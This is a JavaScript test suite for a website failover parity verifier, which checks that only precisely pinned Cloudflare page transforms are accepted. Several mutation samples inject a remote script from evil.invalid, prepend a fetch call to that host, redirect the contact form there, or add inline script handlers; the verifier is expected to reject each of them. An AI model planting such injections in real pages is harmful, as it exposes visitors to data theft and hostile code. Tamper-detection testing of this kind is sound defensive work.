import test from "node:test";
import assert from "node:assert/strict";
import { mkdtemp, mkdir, readFile, writeFile, rm } from "node:fs/promises";
import path from "node:path";
import os from "node:os";
import https from "node:https";
import { execFile } from "node:child_process";
import { promisify } from "node:util";
import { createHash } from "node:crypto";
import {
  CF_JSD_TEMPLATE,
  comparePublicBytes,
  createPublicArtifactVerifier,
  assertPublishedSourceRun,
} from "../../infrastructure/failover/public-parity.mjs";
import { prepareRelease } from "../../infrastructure/failover/prepare-release.mjs";
import {
  readOriginManifestEntry,
  verifyOriginManifest,
} from "../../infrastructure/failover/trusted-inspectors.mjs";
const exec = promisify(execFile),
  REPO = "JustinJIndustries/JustinJ_Industries_Website";
const SOURCE = "a".repeat(40),
  CONTROL = "b".repeat(40);
const email = "contact@example.invalid";
const source = `<!doctype html>\n<html><head><title>Approved page</title><link href="/style.css" rel="stylesheet"></head>\n<body class="page"><h1>Approved heading</h1><a href="/services/">Services</a><form action="/inquiry" method="post"><label>Name<input name="name"></label></form><a\n class="contact" href="mailto:${email}?subject=Hello"\n >${email}</a>\n</body></html>\n`;
const encode = (value) =>
  Buffer.from([83, ...Buffer.from(value).map((x) => x ^ 83)]).toString("hex");
const jsd = CF_JSD_TEMPLATE.replace("<ray>", "a".repeat(16)).replace(
  "<time>",
  Buffer.from("1790000000").toString("base64"),
);
const helper =
  '<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script>';
const canary = `<a href="https://www.justinjindustries.com/cdn-cgi/content?id=${"a".repeat(80)}" aria-hidden="true" rel="nofollow noopener" style="display: none !important; visibility: hidden !important"></a>`;
function transformed(html = source) {
  return html
    .replace('<body class="page">', '<body class="page">' + canary)
    .replace(
      `<a\n class="contact" href="mailto:${email}?subject=Hello"\n >`,
      `<a class="contact" href="/cdn-cgi/l/email-protection#${encode(email)}?subject=Hello">`,
    )
    .replace(
      `>${email}</a>`,
      `><span class="__cf_email__" data-cfemail="${encode(email)}">[email&#160;protected]</span></a>`,
    )
    .replace("</body>", helper + "<script>" + jsd + "</script></body>");
}

test("exact artifact bytes pass unchanged; precisely pinned Cloudflare transforms restore full byte identity", () => {
  assert.equal(comparePublicBytes(source, source, true).exact, true);
  const result = comparePublicBytes(source, transformed(), true);
  assert.equal(result.exact, false);
  assert.deepEqual(result.transforms, {
    hiddenCanary: 1,
    emailHref: 1,
    emailText: 1,
    emailMarkup: 1,
    emailDecoder: 1,
    jsDetection: 1,
    managedRobots: 0,
  });
  // Repeated requests may vary only constrained security identifiers and email XOR key.
  assert.doesNotThrow(() =>
    comparePublicBytes(
      source,
      transformed().replace("a".repeat(16), "b".repeat(16)),
      true,
    ),
  );
});

test("email link with encoded query must decode to the complete exact reviewed target", () => {
  const actual = transformed().replace(
    encode(email) + "?subject=Hello",
    encode(email + "?subject=Hello"),
  );
  assert.doesNotThrow(() => comparePublicBytes(source, actual, true));
  assert.throws(() =>
    comparePublicBytes(
      source,
      actual.replace(
        encode(email + "?subject=Hello"),
        encode(email + "?subject=Changed"),
      ),
      true,
    ),
  );
});

const mutations = [
  [
    "nonempty hidden canary",
    (s) =>
      s.replace(
        'visibility: hidden !important"></a>',
        'visibility: hidden !important">unexpected</a>',
      ),
  ],
  ["unexpected byte-order marker", (s) => "\uFEFF" + s],
  ["visible copy", (s) => s.replace("Approved heading", "Different heading")],
  ["navigation", (s) => s.replace('href="/services/"', 'href="/other/"')],
  [
    "form destination",
    (s) => s.replace('action="/inquiry"', 'action="https://evil.invalid/"'),
  ],
  [
    "new script",
    (s) =>
      s.replace(
        "</body>",
        '<script src="https://evil.invalid/x.js"></script></body>',
      ),
  ],
  [
    "known-script tampering",
    (s) =>
      s.replace(
        "var b=a.contentDocument",
        "fetch('https://evil.invalid');var b=a.contentDocument",
      ),
  ],
  [
    "canary destination",
    (s) =>
      s.replace(
        "https://www.justinjindustries.com/cdn-cgi/content",
        "https://evil.invalid/cdn-cgi/content",
      ),
  ],
  [
    "canary query shape",
    (s) => s.replace('aria-hidden="true"', 'aria-hidden="false"'),
  ],
  [
    "inline script in email anchor",
    (s) => s.replace("</a>\n", "<script>bad()</script></a>\n"),
  ],
  [
    "extra email attribute",
    (s) =>
      s.replace('<a class="contact"', '<a onclick="bad()" class="contact"'),
  ],
  ["email query", (s) => s.replace("?subject=Hello", "?subject=Other")],
  [
    "different email",
    (s) => s.replaceAll(encode(email), encode("other@example.invalid")),
  ],
  ["email-helper version", (s) => s.replace("/5c5dd728/", "/deadbeef/")],
  [
    "duplicate security script",
    (s) => s.replace("</body>", "<script>" + jsd + "</script></body>"),
  ],
  [
    "invalid security identifier",
    (s) => s.replace("r:'" + "a".repeat(16), "r:'not-hex"),
  ],
  [
    "non-ASCII time",
    (s) =>
      s.replace(
        Buffer.from("1790000000").toString("base64"),
        Buffer.from(Array(10).fill(0xb1)).toString("base64"),
      ),
  ],
];
for (const [name, mutate] of mutations)
  test(`unreviewed ${name} is rejected rather than hidden by normalization`, () => {
    assert.throws(() =>
      comparePublicBytes(source, mutate(transformed()), true),
    );
  });

test("pinned transformations cannot erase changes in raw text, attributes, comments or inert markup", () => {
  const insertions = [helper, "<script>" + jsd + "</script>"];
  const wrappers = [
    ['<textarea name="message">', "</textarea>"],
    ["<title>", "</title>"],
    ["<style>", "</style>"],
    ['<script type="application/json">', "</script>"],
    ["<xmp>", "</xmp>"],
    ["<iframe>", "</iframe>"],
    ["<noscript>", "</noscript>"],
    ["<!--", "-->"],
    ["<div data-example='", "'></div>"],
    ["<template>", "</template>"],
    ["<svg><text>", "</text></svg>"],
    ["<select><option>", "</option></select>"],
  ];
  for (const [open, close] of wrappers) {
    for (const insertion of insertions) {
      const expected = `<!doctype html><html><body>${open}${close}</body></html>`;
      const actual = `<!doctype html><html><body>${open}${insertion}${close}</body></html>`;
      assert.throws(
        () => comparePublicBytes(expected, actual, true),
        `protected insertion: ${open}`,
      );
    }
    const before = `<!doctype html><html><body>${open}${email}${close}</body></html>`;
    const after = before.replace(
      email,
      `<span class="__cf_email__" data-cfemail="${encode(email)}">[email&#160;protected]</span>`,
    );
    assert.throws(
      () => comparePublicBytes(before, after, true),
      `protected email: ${open}`,
    );
  }
});

test("mailto and canary matching requires actual attribute/tag boundaries", () => {
  const mailto = `href="mailto:${email}?subject=Hello"`;
  const encoded = `href="/cdn-cgi/l/email-protection#${encode(email)}?subject=Hello"`;
  for (const [open, close] of [
    ["<textarea>", "</textarea>"],
    ["<!--", "-->"],
    ["<a data-text='", "'>Text</a>"],
    ["<template>", "</template>"],
  ]) {
    const expected = `<!doctype html><html><body>${open}${mailto}${close}</body></html>`;
    assert.throws(() =>
      comparePublicBytes(expected, expected.replace(mailto, encoded), true),
    );
    const b = `<!doctype html><html><body>${open}<body>${close}</body></html>`;
    const a = b.replace(`${open}<body>`, `${open}<body>${canary}`);
    assert.throws(() => comparePublicBytes(b, a, true));
  }
  const malformed =
    "<!doctype html><html><body><div><template></div></template></body></html>";
  assert.throws(() =>
    comparePublicBytes(
      malformed,
      malformed.replace("</div>", "</div>" + helper),
      true,
    ),
  );
});

test("ambiguous raw-text closing tags cannot expose attribute strings as body scripts", () => {
  for (const name of [
    "textarea",
    "title",
    "script",
    "style",
    "iframe",
    "noscript",
  ]) {
    const expected =
      "<html><body><" +
      name +
      "></" +
      name +
      ' data-x="greater>"></body></html>';
    for (const insertion of [helper, "<script>" + jsd + "</script>"]) {
      const observed = expected.replace("greater>", "greater>" + insertion);
      assert.throws(() => comparePublicBytes(expected, observed, true));
    }
  }
});

test("non-HTML assets remain byte-exact, including changes that look like harmless minification", () => {
  assert.throws(() =>
    comparePublicBytes("body { color: red; }", "body{color:red}", false),
  );
  assert.throws(() => comparePublicBytes(source, transformed(), false));
});

test("only exact observed managed robots prefix on robots.txt preserves full owner bytes", async () => {
  const prefix = await readFile(
    new URL(
      "./fixtures/cloudflare-managed-robots-20261024.txt",
      import.meta.url,
    ),
  );
  const owner = Buffer.from(
    "User-agent: *\nAllow: /\nSitemap: https://www.justinjindustries.com/sitemap.xml\n",
  );
  const observed = Buffer.concat([prefix, owner]);
  assert.equal(
    comparePublicBytes(owner, observed, false, "robots.txt").transforms
      .managedRobots,
    1,
  );
  for (const mutation of [
    Buffer.concat([
      Buffer.from(prefix.toString().replace("search=yes", "search=not")),
      owner,
    ]),
    Buffer.concat([
      prefix,
      Buffer.from(owner.toString().replace("Allow: /", "Allow: X")),
    ]),
    Buffer.concat([prefix, prefix, owner]),
    Buffer.concat([observed, Buffer.from("\n")]),
  ])
    assert.throws(() =>
      comparePublicBytes(owner, mutation, false, "robots.txt"),
    );
  assert.throws(() => comparePublicBytes(owner, observed, false, "other.txt"));
  assert.throws(() => comparePublicBytes(owner, observed, true, "robots.txt"));
});

async function fixture(t) {
  const root = await mkdtemp(path.join(os.tmpdir(), "jji-public-parity-"));
  t.after(() => rm(root, { recursive: true, force: true }));
  const src = path.join(root, "source");
  await mkdir(src);
  await writeFile(path.join(src, "index.html"), source);
  await writeFile(path.join(src, "style.css"), "body { color: red; }");
  const packageRoot = path.join(root, "package");
  const meta = await prepareRelease({
    source: src,
    output: packageRoot,
    bootstrap: true,
  });
  const options = {
    packageRoot,
    approvedSourceCommit: SOURCE,
    approvedWorkflowCommit: CONTROL,
    approvedRelease: meta.release,
    provenance: {
      repository: REPO,
      sourceCommit: SOURCE,
      workflowCommit: CONTROL,
      workflowRunId: "42",
    },
  };
  return { root, packageRoot, meta, options };
}

test("public verifier binds complete artifact inventories, provenance and primary marker", async (t) => {
  const f = await fixture(t);
  let current = "stage";
  let marker = "primary";
  const fetcher = async (url, options) => {
    assert.equal(new URL(url).origin, "https://www.justinjindustries.com");
    assert.deepEqual(Object.keys(options).sort(), [
      "headers",
      "redirect",
      "signal",
    ]);
    const file = new URL(url).pathname.slice(1);
    let bytes = await readFile(path.join(f.packageRoot, current, file));
    if (file.endsWith(".html"))
      bytes = Buffer.from(transformed(bytes.toString("utf8")));
    return new Response(bytes, {
      headers: {
        "content-type": file.endsWith(".html")
          ? "text/html; charset=utf-8"
          : "text/css",
        "x-jji-source": marker,
      },
    });
  };
  const verify = await createPublicArtifactVerifier({
    ...f.options,
    fetcher,
    requirePrimaryMarker: true,
  });
  assert.equal(
    (await verify(f.meta.previousFiles)).verifiedFiles,
    f.meta.previousFiles.length,
  );
  current = "public";
  assert.equal((await verify(f.meta.files)).verifiedFiles, f.meta.files.length);
  marker = "fallback";
  await assert.rejects(verify(f.meta.files), /status mismatch/);
  await assert.rejects(verify(f.meta.files.slice(1)), /not bound/);
  for (const changed of [
    { origin: "https://evil.invalid/" },
    { origin: "http://www.justinjindustries.com/" },
    { origin: "https://justinjindustries.com/" },
    { origin: "https://www.justinjindustries.com.evil.invalid/" },
    { origin: "https://user@www.justinjindustries.com/" },
    { approvedSourceCommit: "f".repeat(40) },
    { approvedRelease: "f".repeat(64) },
    { approvedWorkflowCommit: "f".repeat(40) },
    { provenance: { ...f.options.provenance, repository: "other/repo" } },
  ])
    await assert.rejects(
      createPublicArtifactVerifier({ ...f.options, ...changed, fetcher }),
    );
});

test("corrupt local artifact is rejected before a network comparison can legitimize it", async (t) => {
  const f = await fixture(t);
  let calls = 0;
  const verify = await createPublicArtifactVerifier({
    ...f.options,
    fetcher: async () => {
      calls++;
      return new Response("corrupt");
    },
  });
  await writeFile(
    path.join(f.packageRoot, "public", f.meta.files[0].path),
    "corrupt",
  );
  await assert.rejects(verify(f.meta.files), /artifact bytes changed/);
  assert.equal(calls, 0);
});

test("immutable backup verification remains strict and rejects even recognized edge transformations", async () => {
  const entries = [
    {
      path: "index.html",
      sha256: createHash("sha256").update(source).digest("hex"),
    },
  ];
  await assert.rejects(
    verifyOriginManifest(
      "https://aaaaaaaa.jji-backup-20261023.pages.dev/",
      entries,
      { fetcher: async () => new Response(transformed()) },
    ),
    /mismatch/,
  );
});

test("production provenance must be completed success for exact approved source and original publisher", () => {
  const r = {
    id: 123,
    status: "completed",
    conclusion: "success",
    head_branch: "main",
    head_sha: SOURCE,
    path: ".github/workflows/jekyll-gh-pages.yml",
    repository: { full_name: REPO },
  };
  assert.equal(assertPublishedSourceRun(r, SOURCE).sourceCommit, SOURCE);
  for (const x of [
    { conclusion: "failure" },
    { status: "in_progress" },
    { head_sha: "f".repeat(40) },
    { head_branch: "other" },
    { path: "other.yml" },
    { repository: { full_name: "other/repo" } },
  ])
    assert.throws(() => assertPublishedSourceRun({ ...r, ...x }, SOURCE));
});

test("TLS failures, challenges and denied statuses never trigger alternate-host or insecure retries", async () => {
  const e = {
    path: "index.html",
    sha256: createHash("sha256").update(source).digest("hex"),
  };
  for (const code of [
    "CERT_HAS_EXPIRED",
    "ERR_TLS_CERT_ALTNAME_INVALID",
    "DEPTH_ZERO_SELF_SIGNED_CERT",
  ]) {
    let calls = 0;
    await assert.rejects(
      readOriginManifestEntry("https://www.justinjindustries.com/", e, {
        fetcher: async (url, options) => {
          calls++;
          assert.equal(new URL(url).hostname, "www.justinjindustries.com");
          assert.deepEqual(Object.keys(options).sort(), [
            "headers",
            "redirect",
            "signal",
          ]);
          throw Object.assign(new Error("fixture TLS failure"), { code });
        },
      }),
      /no TLS bypass/,
    );
    assert.equal(calls, 1);
  }
  for (const status of [403, 404, 429, 500])
    await assert.rejects(
      readOriginManifestEntry("https://www.justinjindustries.com/", e, {
        fetcher: async () => new Response(source, { status }),
      }),
    );
  await assert.rejects(
    readOriginManifestEntry("https://www.justinjindustries.com/", e, {
      fetcher: async () =>
        new Response(source, { headers: { "cf-mitigated": "challenge" } }),
    }),
    /no bypass/,
  );
});

test("actual loopback TLS rejects an untrusted certificate and wrong hostname with normal validation", async (t) => {
  assert.notEqual(process.env.NODE_TLS_REJECT_UNAUTHORIZED, "0");
  const root = await mkdtemp(path.join(os.tmpdir(), "jji-tls-fixture-"));
  t.after(() => rm(root, { recursive: true, force: true }));
  await writeFile(
    path.join(root, "openssl.cnf"),
    "[req]\ndistinguished_name=dn\nx509_extensions=ext\nprompt=no\n[dn]\nCN=localhost\n[ext]\nsubjectAltName=DNS:localhost\nbasicConstraints=critical,CA:TRUE\n",
  );
  // Ephemeral localhost test material only; never installed or committed.
  await exec(
    "openssl",
    [
      "req",
      "-x509",
      "-newkey",
      "rsa:2048",
      "-nodes",
      "-config",
      path.join(root, "openssl.cnf"),
      "-keyout",
      path.join(root, "key.pem"),
      "-out",
      path.join(root, "cert.pem"),
      "-days",
      "1",
    ],
    { timeout: 15000 },
  );
  const cert = await readFile(path.join(root, "cert.pem"));
  const server = https.createServer(
    { key: await readFile(path.join(root, "key.pem")), cert },
    (_req, res) => res.end("approved"),
  );
  await new Promise((resolve, reject) =>
    server.once("error", reject).listen(0, "127.0.0.1", resolve),
  );
  t.after(
    () =>
      new Promise((resolve) => {
        server.closeAllConnections();
        server.close(resolve);
      }),
  );
  const port = server.address().port;
  const entry = {
    path: "index.html",
    sha256: createHash("sha256").update("approved").digest("hex"),
  };
  await assert.rejects(
    readOriginManifestEntry("https://www.justinjindustries.com/", entry, {
      fetcher: (_url, options) => fetch(`https://127.0.0.1:${port}/`, options),
    }),
    /no TLS bypass/,
  );
  const get = (servername) =>
    new Promise((resolve, reject) => {
      https
        .get(
          {
            hostname: "127.0.0.1",
            port,
            servername,
            ca: cert,
            rejectUnauthorized: true,
          },
          (res) => {
            res.resume();
            res.on("end", () => resolve(res.statusCode));
          },
        )
        .on("error", reject);
    });
  assert.equal(await get("localhost"), 200);
  await assert.rejects(
    get("www.justinjindustries.com"),
    (e) => e.code === "ERR_TLS_CERT_ALTNAME_INVALID",
  );
});
